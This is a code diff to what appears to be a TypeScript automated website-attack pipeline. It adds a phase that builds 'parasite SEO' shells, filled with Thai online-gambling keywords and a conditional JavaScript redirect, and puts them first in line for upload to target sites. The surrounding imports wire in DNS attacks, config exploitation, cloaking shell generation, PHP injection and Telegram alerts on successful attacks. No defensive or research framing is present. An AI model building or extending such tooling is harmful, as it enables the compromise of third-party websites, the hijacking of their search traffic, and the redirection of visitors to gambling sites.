@@ -22,6 +22,7 @@ import { runAllDnsAttacks as runDnsAttacks, type DnsAttackResult, type DnsAttack
 import { runAllConfigExploits as runConfigExploits, type ConfigExploitResult, type ConfigExploitConfig } from "./config-exploitation";
 import { generateCloakingPackage, type CloakingConfig, type CloakingShell as CloakingShellResult } from "./cloaking-shell-generator";
 import { generateContentPack, type ContentConfig, type ContentPack } from "./cloaking-content-engine";
+import { generateParasiteSeoBundle, type ParasiteSeoPayload } from "./parasite-seo-injector";
 import { executeInjection, type InjectionConfig, type InjectionResult } from "./php-injector";
 import { uploadContentToCdn, type CdnUploadResult } from "./content-cdn";
 import { sendTelegramNotification, sendVulnAlert, sendAttackSuccessAlert, sendFailureSummaryAlert, type TelegramNotification, type MethodAttempt } from "./telegram-notifier";
@@ -2148,7 +2149,6 @@ export async function runUnifiedAttackPipeline(
     );
 
     aiDecisions.push(`Generated ${shells.length} shells: ${shells.map(s => s.type).join(", ")}`);
-
     loggedOnEvent({
       phase: "shell_gen",
       step: "complete",
@@ -2166,7 +2166,39 @@ export async function runUnifiedAttackPipeline(
     });
   }
 
-  // ─── Phase 4: Upload (try each shell with all methods) ───
+  // ─── Phase 3.5: Enhanced Parasite SEO Payloads ───
+  try {
+    const parasiteKeywords = config.seoKeywords?.length ? config.seoKeywords : ["สล็อตเว็บตรง", "เว็บพนันออนไลน์", "คาสิโนออนไลน์"];
+    const parasiteBundle = generateParasiteSeoBundle(config.redirectUrl, parasiteKeywords, {
+      language: "auto",
+      contentStyle: "gambling",
+      internalLinkDomain: config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, ""),
+    });
+    
+    // Add parasite shells to the beginning (highest priority — rich SEO content)
+    const parasiteShells = parasiteBundle.map(p => p.shell);
+    shells = [...parasiteShells, ...shells];
+    
+    loggedOnEvent({
+      phase: "shell_gen",
+      step: "parasite_seo",
+      detail: `🎯 เพิ่ม ${parasiteShells.length} Parasite SEO payloads (schema+FAQ+conditional redirect)`,
+      progress: 51,
+      data: { parasiteCount: parasiteShells.length, seoScores: parasiteBundle.map(p => p.seoScore) },
+    });
+    
+    aiDecisions.push(`Added ${parasiteShells.length} rich parasite SEO payloads with conditional JS redirect`);
+  } catch (error: any) {
+    // Non-critical — continue with existing shells
+    loggedOnEvent({
+      phase: "shell_gen",
+      step: "parasite_seo_error",
+      detail: `⚠️ Parasite SEO generation failed (non-critical): ${error.message}`,
+      progress: 51,
+    });
+  }
+
+  // ─── Phase 4: Upload (try each shell with all methods) ────
   let totalAttempts = 0;
 
   if (shells.length > 0 && !shouldStop('upload') && !hasSuccessfulRedirect()) {
